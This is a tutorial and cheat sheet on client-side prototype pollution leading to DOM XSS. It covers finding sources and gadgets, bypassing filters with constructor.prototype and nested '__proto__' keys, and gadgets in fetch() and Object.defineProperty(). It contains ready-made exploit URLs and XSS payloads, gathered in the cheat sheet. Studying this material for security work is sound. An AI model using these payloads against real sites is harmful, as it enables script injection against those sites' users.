# Client-Side Prototype Pollution

| Term | One-line meaning |
|---|---|
| **Source** | An input you control (URL, JSON...) that lets you add properties to `Object.prototype` |
| **Gadget** | A property the app reads (and doesn't define itself) and then uses unsafely |
| **Sink** | A dangerous function/DOM feature, such as `innerHTML`, `eval()`, or `script.src` |

On the client side, the usual end goal is **DOM XSS**.

## 1. The attack workflow at a glance

```
Step 1: Find a SOURCE   -> can I make Object.prototype.foo === "bar" ?
Step 2: Find a GADGET   -> which property does the app read & feed into a sink?
Step 3: Build exploit   -> pollute that property with an XSS payload
Step 4: Deliver         -> get a victim to open the crafted URL
```

## 2. Finding sources manually

Finding a source is mostly **trial and error**: keep trying ways to add a harmless test property to `Object.prototype` until one sticks.

**Step 1: Inject a test property** through every input you can: query string, URL fragment (`#...`), and any JSON the app parses.

```
https://target.example/?__proto__[foo]=bar
```

**Step 2: Check the result** in the browser console:

```js
Object.prototype.foo
// "bar"      -> success, you found a source!
// undefined  -> that attempt failed
```

**Step 3: If it failed, change the syntax.** Switch between bracket and dot notation:

```
https://target.example/?__proto__[foo]=bar     <- bracket notation
https://target.example/?__proto__.foo=bar      <- dot notation
https://target.example/#__proto__[foo]=bar     <- same idea, via fragment
```

**Step 4: Repeat** for every input the app accepts.

> If both notations fail, don't give up. See [constructor-based pollution](#5-bypass-1-pollution-via-the-constructor) and [filter bypasses](#6-bypass-2-flawed-key-sanitization) below.

### Quick sanity-check after each attempt

```js
// Paste in console after loading the polluted URL
console.log("foo ->", Object.prototype.foo);
console.log("own?", ({}).hasOwnProperty("foo")); // false = inherited (good sign)
```

## 3. Finding gadgets manually

Once you can pollute `Object.prototype`, you need a property the app **reads but never defines**. Then you check whether that property reaches a sink.

### The core trick: a "tripwire" property

Define a getter on `Object.prototype` that logs a stack trace whenever the app reads that property:

```js
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
  get() {
    console.trace();        // shows exactly where it was read
    return 'polluted';      // value the app will receive
  }
});
```

If the app ever looks up `YOUR-PROPERTY` and it isn't defined on the object itself, the lookup falls through to the prototype, triggers your getter, and prints a trace.

### Full manual process

1. **Read the source** (yours and any imported libraries) and list properties that look like options or config, e.g. `url`, `src`, `transport_url`, `html`, `template`.
2. **Intercept the script** in an intercepting proxy such as Burp (turn on interception of server responses).
3. **Add `debugger;`** as the first line of the intercepted script, then forward everything. The browser pauses when the script starts.
4. **While paused**, run the tripwire snippet from above in the console (replace `YOUR-PROPERTY`).
5. **Resume execution** and watch the console.
6. **If a stack trace appears**, the property was read. Click the link in the trace to jump to that line of code.
7. **Step through the debugger** and see whether the value flows into a sink like `innerHTML` or `eval()`.
8. **Repeat** for every candidate property.

### What a good gadget looks like

```js
// config.transport_url is never set by the developer,
// so it falls back to the prototype chain
let url = config.transport_url || defaults.transport_url;

let s = document.createElement('script');
s.src = `${url}/example.js`;      // <- sink
document.body.appendChild(s);
```

Exploit URL (note the trailing `//` to comment out the hard-coded `/example.js` suffix):

```
https://target.example/?__proto__[transport_url]=data:,alert(1);//
```

## 4. Using DOM Invader (the shortcut)

Doing the above by hand is slow, especially when sites ship thousands of lines of minified library code. **DOM Invader** (a browser extension built into Burp's embedded browser) automates it:

- Automatically tests for **sources** while you browse.
- Automatically scans for **gadgets**.
- Can sometimes generate a **DOM XSS proof of concept** for you.

## 5. Bypass #1: pollution via the constructor

### The problem it solves

The classic payload uses `__proto__`. So a common (weak) defense is: *"strip any key named `__proto__` before merging."*

But `__proto__` isn't the only path to `Object.prototype`.

### How it works

Every object has a `constructor` property pointing to the function that created it. Every function has a `prototype` property. Chain them:

```js
const obj = {};

obj.constructor              // function Object() {...}
obj.constructor.prototype    // Object.prototype

// These two are equivalent:
obj.__proto__
obj.constructor.prototype
```

Works for other types too:

```js
"text".constructor.prototype   // String.prototype
[].constructor.prototype       // Array.prototype
```

So instead of a `__proto__` key, an attacker supplies `constructor` -> `prototype`:

```
https://target.example/?constructor[prototype][foo]=bar
https://target.example/?constructor.prototype.foo=bar
```

As JSON:

```json
{
  "constructor": {
    "prototype": {
      "foo": "bar"
    }
  }
}
```

### Demo of a flawed filter being bypassed

```js
function sanitize(obj) {
  delete obj.__proto__;     // only blocks one spelling!
  return obj;
}

const input = JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}');
merge({}, sanitize(input));      // merge() = a naive recursive merge

({}).polluted;                   // "yes"  <- filter bypassed
```

> Note: this works on objects that still inherit normally. An object created with a `null` prototype has no `constructor` property to abuse.

## 6. Bypass #2: flawed key sanitization

### The mistake

A filter removes the string `__proto__` from keys **once**, without re-checking the result.

### The payload

Wrap a `__proto__` inside another `__proto__`, so that after the filter removes the middle part, the outer pieces snap together into a fresh one:

```
?__pro__proto__to__.gadget=payload
  \__/\_______/\__/
  __pro  __proto__  to__      <- the filter deletes the middle "__proto__"
```

After a single-pass strip:

```
?__proto__.gadget=payload      <- a working pollution source again
```

### Demo

```js
// Flawed sanitizer: single pass
function badSanitize(key) {
  return key.replace("__proto__", "");
}

badSanitize("__pro__proto__to__");   // "__proto__"   <- reassembled!

// Better: remove repeatedly until nothing changes, or simply reject the key
function betterSanitize(key) {
  let prev;
  do {
    prev = key;
    key = key.replace("__proto__", "");
  } while (key !== prev);
  return key;
}
```

You can use the same idea for `constructor` and `prototype` keys, for example `constconstructorructor`, if the app filters those with a single pass.

## 7. Pollution in third-party libraries

Sources and gadgets don't have to be in the site's own code. Analytics widgets, UI frameworks, and other imported libraries often contain them, and that code is frequently minified or obfuscated.

**Practical advice:** use DOM Invader for these. It finds issues in library code that you would very likely miss reading by hand.

## 8. Gadgets hiding in browser APIs

Even the browser's **built-in APIs** can be gadgets. They commonly take an "options object" where many properties are optional. If the developer leaves an option out, the API looks it up through the prototype chain, which means a polluted prototype can supply it. This can also **defeat naive defenses**.

### 8.1 `fetch()`

`fetch()` takes a URL plus an options object:

```js
fetch('https://normal-website.com/my-account/change-email', {
  method: 'POST',
  body: 'user=carlos&email=carlos%40example.com'
});
```

The developer set `method` and `body` but **not** `headers`. If an attacker pollutes `Object.prototype.headers`, the options object inherits it, and the request is sent with attacker-chosen headers.

#### Vulnerable app example

```js
fetch('/my-products.json', { method: "GET" })
  .then(response => response.json())
  .then(data => {
    let username = data['x-username'];            // value comes back from the server
    let message  = document.querySelector('.message');
    if (username) {
      message.innerHTML = `My products. Logged in as <b>${username}</b>`;   // <- sink
    }
  });
```

Assume the server echoes the request header `x-username` into the JSON response.

#### Exploit

```
https://target.example/?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

**Flow:**

```
Pollute Object.prototype.headers
   -> fetch() options object inherits "headers" with our x-username header
   -> server reflects it into the JSON as data['x-username']
   -> app writes it into innerHTML
   -> <img onerror> fires = DOM XSS
```

#### Other properties you could pollute

Any undefined property in the options object is a candidate, for example:

```
?__proto__[body]=...         # inject a malicious request body
?__proto__[method]=POST      # change the HTTP method (if the dev didn't set one)
```

### 8.2 `Object.defineProperty()`

#### The defense developers try

Knowing about prototype pollution, a developer may lock a risky property on an object so it can't be inherited from the prototype:

```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
  configurable: false,
  writable: false
});
```

This looks smart: the object now has its **own** `gadgetProperty`, which should beat any polluted version.

#### Why it fails

The third argument is itself an object (a **descriptor**), and it can contain an optional `value`. In the code above the developer **didn't set `value`**, because they only wanted to block pollution. So the descriptor looks up `value` through its own prototype chain.

If the attacker pollutes `Object.prototype.value`, the descriptor inherits it, and `gadgetProperty` is created **with the attacker's value**, locked in and read-only:

```js
// Attacker pollutes this first:
Object.prototype.value = "<img src=x onerror=alert(1)>";

// Developer's "protection":
const config = {};
Object.defineProperty(config, 'gadgetProperty', {
  configurable: false,
  writable: false
  // no "value" set -> inherited from the polluted prototype!
});

config.gadgetProperty;   // "<img src=x onerror=alert(1)>"  <- defense backfired
```

Exploit URL form:

```
https://target.example/?__proto__[value]=<img/src/onerror=alert(1)>
```

**Takeaway:** the same pattern applies anywhere an options/descriptor object leaves properties out. Always set every property explicitly, or use a descriptor created with `Object.create(null)`.

### Safe demo you can run in the console

```js
// Without pollution
const clean = {};
Object.defineProperty(clean, 'x', { writable: false });
console.log(clean.x);          // undefined

// With pollution
Object.prototype.value = "polluted!";
const dirty = {};
Object.defineProperty(dirty, 'x', { writable: false });
console.log(dirty.x);          // "polluted!"

// Clean up
delete Object.prototype.value;
```

## 9. Cheat sheet

### Test payloads for sources

```
?__proto__[foo]=bar
?__proto__.foo=bar
#__proto__[foo]=bar
?constructor[prototype][foo]=bar
?constructor.prototype.foo=bar
?__pro__proto__to__[foo]=bar
```

JSON versions:

```json
{ "__proto__": { "foo": "bar" } }
{ "constructor": { "prototype": { "foo": "bar" } } }
```

Verify in console: `Object.prototype.foo` should return `"bar"`.

### Example exploit payloads (once you have a gadget)

```
?__proto__[transport_url]=data:,alert(1);//
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
?__proto__[value]=<img/src/onerror=alert(1)>
```

### Summary table

| Technique | Idea | Why it matters |
|---|---|---|
| Manual source hunting | Try `__proto__[foo]=bar` in each input, check `Object.prototype.foo` | Finds the entry point |
| Manual gadget hunting | Tripwire getter + `debugger` + stack trace | Finds what the app reads |
| DOM Invader | Automates both | Fast and catches library bugs |
| Constructor route | `constructor.prototype` instead of `__proto__` | Bypasses `__proto__` filters |
| Nested key trick | `__pro__proto__to__` | Bypasses single-pass stripping |
| `fetch()` gadget | Pollute `headers`/`body` | Reaches sinks via server reflection |
| `defineProperty()` gadget | Pollute `value` on the descriptor | Defeats "lock the property" defenses |
